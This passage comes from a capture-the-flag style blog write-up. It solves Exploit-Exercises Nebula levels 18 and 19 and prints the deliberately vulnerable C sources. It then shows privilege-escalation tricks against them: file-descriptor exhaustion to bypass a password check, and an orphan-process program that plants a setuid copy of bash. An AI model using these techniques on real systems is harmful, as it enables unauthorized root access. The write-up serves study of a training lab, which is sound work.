</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;getopt.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>struct</span> {
  FILE <span style=color:#f92672>*</span>debugfile;
  <span style=color:#66d9ef>int</span> verbose;
  <span style=color:#66d9ef>int</span> loggedin;
} globals;

<span style=color:#75715e>#define dprintf(...) if(globals.debugfile) \
</span><span style=color:#75715e>  fprintf(globals.debugfile, __VA_ARGS__)
</span><span style=color:#75715e>#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \
</span><span style=color:#75715e>  fprintf(globals.debugfile, __VA_ARGS__)
</span><span style=color:#75715e></span>
<span style=color:#75715e>#define PWFILE &#34;/home/flag18/password&#34;
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>login</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pw)
{
  FILE <span style=color:#f92672>*</span>fp;

  fp <span style=color:#f92672>=</span> fopen(PWFILE, <span style=color:#e6db74>&#34;r&#34;</span>);
  <span style=color:#66d9ef>if</span>(fp) {
      <span style=color:#66d9ef>char</span> file[<span style=color:#ae81ff>64</span>];

      <span style=color:#66d9ef>if</span>(fgets(file, <span style=color:#66d9ef>sizeof</span>(file) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>, fp) <span style=color:#f92672>==</span> NULL) {
          dprintf(<span style=color:#e6db74>&#34;Unable to read password file %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, PWFILE);
          <span style=color:#66d9ef>return</span>;
      }
                fclose(fp);
      <span style=color:#66d9ef>if</span>(strcmp(pw, file) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) <span style=color:#66d9ef>return</span>;       
  }
  dprintf(<span style=color:#e6db74>&#34;logged in successfully (with%s password file)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,
      fp <span style=color:#f92672>==</span> NULL <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;out&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>);
  
  globals.loggedin <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;

}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>notsupported</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>what)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer <span style=color:#f92672>=</span> NULL;
  asprintf(<span style=color:#f92672>&amp;</span>buffer, <span style=color:#e6db74>&#34;--&gt; [%s] is unsupported at this current time.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, what);
  dprintf(what);
  free(buffer);
}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setuser</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>user)
{
  <span style=color:#66d9ef>char</span> msg[<span style=color:#ae81ff>128</span>];

  sprintf(msg, <span style=color:#e6db74>&#34;unable to set user to &#39;%s&#39; -- not supported.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, user);
  printf(<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, msg);

}

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  <span style=color:#66d9ef>char</span> c;

  <span style=color:#66d9ef>while</span>((c <span style=color:#f92672>=</span> getopt(argc, argv, <span style=color:#e6db74>&#34;d:v&#34;</span>)) <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
      <span style=color:#66d9ef>switch</span>(c) {
          <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;d&#39;</span><span style=color:#f92672>:</span>
              globals.debugfile <span style=color:#f92672>=</span> fopen(optarg, <span style=color:#e6db74>&#34;w+&#34;</span>);
              <span style=color:#66d9ef>if</span>(globals.debugfile <span style=color:#f92672>==</span> NULL) err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Unable to open %s&#34;</span>, optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
              <span style=color:#66d9ef>break</span>;
          <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;v&#39;</span><span style=color:#f92672>:</span>
              globals.verbose<span style=color:#f92672>++</span>;
              <span style=color:#66d9ef>break</span>;
      }
  }

  dprintf(<span style=color:#e6db74>&#34;Starting up. Verbose level = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());
  
  <span style=color:#66d9ef>while</span>(<span style=color:#ae81ff>1</span>) {
      <span style=color:#66d9ef>char</span> line[<span style=color:#ae81ff>256</span>];
      <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>p, <span style=color:#f92672>*</span>q;

      q <span style=color:#f92672>=</span> fgets(line, <span style=color:#66d9ef>sizeof</span>(line)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, stdin);
      <span style=color:#66d9ef>if</span>(q <span style=color:#f92672>==</span> NULL) <span style=color:#66d9ef>break</span>;
      p <span style=color:#f92672>=</span> strchr(line, <span style=color:#e6db74>&#39;\n&#39;</span>); <span style=color:#66d9ef>if</span>(p) <span style=color:#f92672>*</span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      p <span style=color:#f92672>=</span> strchr(line, <span style=color:#e6db74>&#39;\r&#39;</span>); <span style=color:#66d9ef>if</span>(p) <span style=color:#f92672>*</span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;

      dvprintf(<span style=color:#ae81ff>2</span>, <span style=color:#e6db74>&#34;got [%s] as input</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, line);

      <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;login&#34;</span>, <span style=color:#ae81ff>5</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          dvprintf(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;attempting to login</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
          login(line <span style=color:#f92672>+</span> <span style=color:#ae81ff>6</span>);
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;logout&#34;</span>, <span style=color:#ae81ff>6</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          globals.loggedin <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;shell&#34;</span>, <span style=color:#ae81ff>5</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          dvprintf(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;attempting to start shell</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
          <span style=color:#66d9ef>if</span>(globals.loggedin) {
              execve(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, argv, envp);
              err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;unable to execve&#34;</span>);
          }
          dprintf(<span style=color:#e6db74>&#34;Permission denied</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;logout&#34;</span>, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          globals.loggedin <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;closelog&#34;</span>, <span style=color:#ae81ff>8</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          <span style=color:#66d9ef>if</span>(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile <span style=color:#f92672>=</span> NULL;
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;site exec&#34;</span>, <span style=color:#ae81ff>9</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          notsupported(line <span style=color:#f92672>+</span> <span style=color:#ae81ff>10</span>);
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;setuser&#34;</span>, <span style=color:#ae81ff>7</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          setuser(line <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>);
      }
  }

  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>é¢˜ç›®æŒ‡å‡ºæ­¤é¢˜å…±æœ‰ä¸‰ç§è§£æ³•ï¼Œå¯ä»¥å‘ç°<code>notsupported()</code>å‡½æ•°ä¸­çš„<code>dprintf()</code>åº”è¯¥å­˜åœ¨<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</strong>ï¼Œè€Œ<code>setuser()</code>å‡½æ•°ä¸­åº”è¯¥å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œè¿™å¯èƒ½æ˜¯è¯¥é¢˜ç›®çš„å¯èƒ½è§£æ³•ï¼Œä½†è¯¥ç¨‹åºæœ‰ä¸€å®šçš„ä¿æŠ¤æœºåˆ¶ï¼Œç›®å‰è¶…å‡ºèƒ½åŠ›èŒƒå›´ã€‚</p><p>æ‰€ä»¥è¿˜æ˜¯å…³æ³¨å¦ä¸€ä¸ªç¨‹åºæ¼æ´ã€‚ç”±ä»£ç å¯ä»¥çœ‹å‡ºï¼Œåªè¦èƒ½æˆåŠŸç™»å½•ï¼Œå³å¯æ‹¿åˆ°shellï¼ŒæŸ¥çœ‹<code>login()</code>å‡½æ•°ï¼Œå¯ä»¥å‘ç°åªè¦èƒ½è®©<code>password</code>æ–‡ä»¶æ‰“å¼€å¤±è´¥ï¼Œå³å¯æ— å¯†ç ç™»å½•ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•ä½¿<code>fopen()</code>æ‰§è¡Œå¤±è´¥å‘¢ï¼Ÿå¯ä»¥åˆ©ç”¨ç³»ç»Ÿå¯¹shellèµ„æºçš„è®¿é—®é™åˆ¶æ¥å®ç°ï¼Œç³»ç»Ÿæ˜¯é™åˆ¶äº†ç”¨æˆ·æˆ–è¿›ç¨‹çš„èµ„æºä½¿ç”¨çš„ï¼Œå…¶ä¸­å°±æœ‰<strong>å¯ä»¥æ‰“å¼€æœ€å¤§æ–‡ä»¶æè¿°ç¬¦çš„æ•°é‡</strong>ã€‚å¯ä»¥é€šè¿‡<code>ulimit -a</code>æ¥æŸ¥çœ‹ç›¸å…³çš„èµ„æºé™åˆ¶ï¼š</p><p><img src=level18_3.png alt=ç³»ç»Ÿèµ„æºä½¿ç”¨é™åˆ¶></p><p>å…¶ä¸­å¯ä»¥çœ‹åˆ°<code>open files (-n) 1024</code>ï¼Œæ‰€ä»¥ç›®å‰å•ä¸ªè¿›ç¨‹å¯æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦çš„æœ€å¤§æ•°é‡ä¸º1024ï¼Œè¿™ä¸ªæ•°å€¼å¯ä»¥é€šè¿‡<code>ulimit -n number</code>è®¾ç½®ã€‚å…¶ä¸­æ¯ä¸ªè¿›ç¨‹éƒ½é»˜è®¤æ‰“å¼€<code>stdin</code>, <code>stdout</code>, <code>stderr</code>ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬è®¾ç½®<code>ulimit -n 4</code>ã€‚</p><p>è®¾ç½®ä¸º4æ˜¯ä¸ºäº†è¿˜èƒ½æ‰“å¼€ç¨‹åºï¼ˆè®¾ç½®ä¸º3æ—¶ï¼Œæ— æ³•è¿è¡Œç¨‹åºï¼‰ï¼Œå¹¶ä¸”è¿˜å¯ä»¥åˆ©ç”¨flag18ç¨‹åºçš„<code>-d</code>å‚æ•°æŸ¥çœ‹è¾“å‡ºä¿¡æ¯ã€‚æ­¤å¤–æˆ‘ä»¬ç›´æ¥è®¾ç½®<code>-d /dev/tty</code>æ¥å°†è¾“å‡ºçš„debugä¿¡æ¯è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚</p><p>æ‰€ä»¥åœ¨è®¾ç½®äº†<code>-d</code>å‚æ•°çš„æƒ…å†µä¸‹ï¼Œæ‰“å¼€flag18ç¨‹åºæ—¶ï¼Œå³æ‰“å¼€äº†å››ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥loginï¼š</p><p><img src=level18_0.png alt></p><p>å¯ä»¥çœ‹åˆ°ç™»å½•æˆåŠŸï¼Œä½†æ˜¯åœ¨è¿è¡Œ<code>/bin/sh</code>çš„æ—¶å€™æ— æ³•æ‰“å¼€é“¾æ¥åº“ï¼Œé‚£ä¹ˆç™»å½•æˆåŠŸåå°±å¯ä»¥åˆ©ç”¨<code>closelog</code>æ¥å…³é—­ä¸€ä¸ªæ–‡ä»¶ï¼š</p><p><img src=level18_1.png alt></p><p>åˆå‡ºç°äº†é—®é¢˜ï¼Œç”±äºè¿è¡Œ<code>/bin/sh</code>çš„æ—¶å€™å°†ç¨‹åºçš„å‚æ•°ä¹Ÿéƒ½ä¼ é€’äº†è¿‡å»ï¼Œå› æ­¤<code>/bin/sh</code>ç¨‹åºæŠ¥é”™ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œflag18ç¨‹åºçš„æ—¶å€™åœ¨æœ€å‰é¢åŠ ä¸Š<code>--rcfile</code>çš„å‚æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªbashçš„å‚æ•°ï¼Œç”¨æ¥è‡ªå®šä¹‰<code>bashrc</code>æ–‡ä»¶ï¼Œæ­¤å‚æ•°åè·Ÿç€çš„å†…å®¹å³ä½¿æ˜¯ä¸å­˜åœ¨çš„æ–‡ä»¶ä¹Ÿä¸ä¼šæŠ¥é”™ã€‚æ‰€ä»¥åœ¨æ‰§è¡Œ<code>/bin/sh</code>çš„æ—¶å€™ï¼Œ<code>-d</code>ä¼šè¢«å½“æˆä¸€ä¸ªæ— æ•ˆçš„<code>bashrc</code>æ–‡ä»¶è¢«å¿½ç•¥ï¼Œè€Œ<code>/dev/tty</code>åˆ™ä¼šè¢«å½“ä½œbashæ‰§è¡Œçš„æºæ–‡ä»¶ï¼Œè¿™æ ·æ°å¥½æˆ‘ä»¬å¯ä»¥å®ç°ä¸€ä¸ªäº¤äº’å¼çš„shellï¼Œbashä¼šç›´æ¥ä»ç»ˆç«¯è¯»å–è¾“å…¥å¹¶æ‰§è¡Œã€‚ï¼ˆä¸ç„¶<code>/dev/tty</code>å¤„æ¢æˆå…¶å®ƒæ–‡æœ¬æ–‡ä»¶çš„è¯ï¼Œå°±è¦å°†è¦æ‰§è¡Œçš„å‘½ä»¤å…ˆè¡Œå†™å…¥è¯¥æ–‡ä»¶ã€‚ï¼‰</p><p><img src=level18_2.png alt=Level18></p><h2 id=level19>Level19</h2><p>é¢˜ç›®æºç ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/stat.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  pid_t pid;
  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>256</span>];
  <span style=color:#66d9ef>struct</span> stat statbuf;

  <span style=color:#75715e>/* Get the parent&#39;s /proc entry, so we can verify its user id */</span>

  snprintf(buf, <span style=color:#66d9ef>sizeof</span>(buf)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;/proc/%d&#34;</span>, getppid());

  <span style=color:#75715e>/* stat() it */</span>

  <span style=color:#66d9ef>if</span>(stat(buf, <span style=color:#f92672>&amp;</span>statbuf) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
      printf(<span style=color:#e6db74>&#34;Unable to check parent process</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      exit(EXIT_FAILURE);
  }

  <span style=color:#75715e>/* check the owner id */</span>

  <span style=color:#66d9ef>if</span>(statbuf.st_uid <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
      <span style=color:#75715e>/* If root started us, it is ok to start the shell */</span>

      execve(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, argv, envp);
      err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Unable to execve&#34;</span>);
  }

  printf(<span style=color:#e6db74>&#34;You are unauthorized to run this program</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
}
</code></pre></div><p>è¯¥ç¨‹åºçš„é€»è¾‘æ˜¯ï¼Œåˆ¤æ–­çˆ¶è¿›ç¨‹çš„uidæ˜¯å¦ä¸º0ï¼ˆå³rootç”¨æˆ·ï¼‰ï¼Œå¦‚æœæ˜¯åˆ™å¯ä»¥æ‰§è¡Œshellç¨‹åºã€‚æ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯åœ¨æ‰§è¡Œæ­¤ç¨‹åºçš„æ—¶å€™ï¼Œè®©å®ƒçš„çˆ¶è¿›ç¨‹çš„uidä¸º0ã€‚</p><p>åœ¨å¸¸è§„ä¸‹æƒ…å†µä¸‹æ‰§è¡Œç¨‹åºï¼Œç¨‹åºçš„çˆ¶è¿›ç¨‹éƒ½æ˜¯ç”¨æˆ·æ‰€ç™»é™†çš„shellï¼Œå…¶çˆ¶è¿›ç¨‹uidå³ä¸ºç™»å½•ç”¨æˆ·uidã€‚æˆ‘ä»¬æ˜¾ç„¶ä¸å¯èƒ½ä»¥rootç”¨æˆ·ç™»å½•ï¼Œè¦å¦‚ä½•æ‰èƒ½å®ç°ç¨‹åºçš„çˆ¶è¿›ç¨‹uidä¸º0å‘¢ï¼Ÿ</p><p>è¿™å°±è®©æˆ‘ä»¬æƒ³åˆ°äº†<strong>å­¤å„¿è¿›ç¨‹</strong>çš„å¤„ç†æœºåˆ¶ï¼šåœ¨Linuxä¸­ï¼Œä¸€ä¸ªå­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹å¦‚æœåœ¨å­è¿›ç¨‹ç»“æŸä¹‹å‰ä¾¿é€€å‡ºï¼Œé‚£ä¹ˆè¯¥å­è¿›ç¨‹å°±ä¼šè¢«pidä¸º1çš„è¿›ç¨‹æ¥ç®¡ï¼Œå®ƒçš„çˆ¶è¿›ç¨‹ä¼šå˜æ›´ä¸º1å·è¿›ç¨‹ã€‚è€Œ1å·è¿›ç¨‹çš„uidå³ä¸ºrootã€‚</p><p>ç¼–å†™ç¨‹åºï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
	<span style=color:#66d9ef>if</span> (fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
		sleep(<span style=color:#ae81ff>1</span>);
		execl(<span style=color:#e6db74>&#34;/home/flag19/flag19&#34;</span>, <span style=color:#e6db74>&#34;sh&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#34;cp /tmp/bash /home/flag19/; chmod +s /home/flag19/bash&#34;</span>, (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)<span style=color:#ae81ff>0</span>);
		err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Unable to exec flag19&#34;</span>);
	}
	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>åœ¨ä¸Šè¿°ç¨‹åºä¸­ï¼Œç›´æ¥åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œflag19ç¨‹åºï¼Œå¹¶è®¾ç½®å¥½äº†è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸ºäº†ä¿é™©èµ·è§ã€è®©çˆ¶è¿›ç¨‹å…ˆé€€å‡ºï¼Œå…ˆè®©å­è¿›ç¨‹ä¼‘çœ 1sï¼›çˆ¶è¿›ç¨‹å°±ç›´æ¥é€€å‡ºã€‚</p><p><img src=level19_1.png alt=Level19></p></div><div class=post-copyright><p class=copyright-item><span>Author:</span>
<span>Liq3e</span></p><p class=copyright-item><span>Link:</span>
<a href=https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/>https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/</a></p></div><div class=post-tags><section><i class="iconfont icon-tag"></i>Tag(s):
<span class=tag><a href=https://blog.usec.cc/tags/exploit-exercises/>#exploit-exercises</a></span></section><section><a href=javascript:window.history.back();>back</a></span> Â·
<span><a href=https://blog.usec.cc/>home</a></span></section></div><div class=post-nav><a href=https://blog.usec.cc/posts/security/reverse/format-string/ class=prev rel=prev title=æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´><i class="iconfont icon-left"></i>&nbsp;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</a>
<a href=https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/ class=next rel=next title="Wirteup - Junior 0ctf 2017">Wirteup - Junior 0ctf 2017&nbsp;<i class="iconfont icon-right"></i></a></div><div class=post-comment><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
var d=document,s=d.createElement('script');s.async=true;s.src='//'+"l33-1"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></article></div></main><footer class=footer><div class=copyright>&copy;
<span itemprop=copyrightYear>2020 - 2020</span>
<span class=with-love><i class="iconfont icon-love"></i></span><span class=author itemprop=copyrightHolder><a href=https://blog.usec.cc/>Liq3e</a> |</span>
<span>Powered by <a href=https://gohugo.io/ target=_blank rel="external nofollow">Hugo</a> & <a href=https://github.com/liuzc/leaveit target=_blank rel="external nofollow">LeaveIt</a></span></div></footer><link href=//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css rel=stylesheet><script src=/js/vendor_gallery.min.js async></script></div></body></html>